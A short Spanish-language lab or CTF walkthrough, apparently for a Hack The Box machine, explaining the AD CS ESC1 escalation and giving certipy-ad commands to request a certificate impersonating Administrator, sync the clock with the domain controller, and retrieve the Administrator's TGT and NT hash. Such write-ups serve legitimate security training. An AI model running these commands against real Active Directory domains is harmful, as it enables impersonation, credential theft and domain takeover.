ESC1 es una escalada en AD CS donde una plantilla permite al solicitante definir el SAN (a nombre de quién se emite el certificado) y habilita autenticación de cliente, sin requerir aprobación. Esto permite a un usuario de bajo privilegio pedir un certificado suplantando al Administrator y autenticarse como él para obtener su hash/TGT.
#### Paso 1 — Solicitar el certificado suplantando al Administrator

bash

```bash
certipy-ad req -u 'usuario@dominio.htb' -p 'PASSWORD' \
  -dc-ip 10.129.X.X \
  -ca 'dominio-DC-CA' \
  -template 'NombrePlantilla' \
  -upn 'administrator@dominio.htb'
```

Esto genera `administrator.pfx`. El flag `-upn` es el que escribe la identidad suplantada en el SAN.

#### Paso 2 — Sincronizar el reloj con el DC (evita clock skew)

bash

```bash
sudo timedatectl set-ntp off
sudo rdate -n 10.129.X.X
# alternativa: sudo ntpdate 10.129.X.X
```

#### Paso 3 — Autenticar con el certificado y obtener el NT hash

bash

```bash
certipy-ad auth -pfx administrator.pfx -domain dominio.htb -dc-ip 10.129.X.X
```

Devuelve un TGT (`.ccache`) y el **NT hash** del Administrator.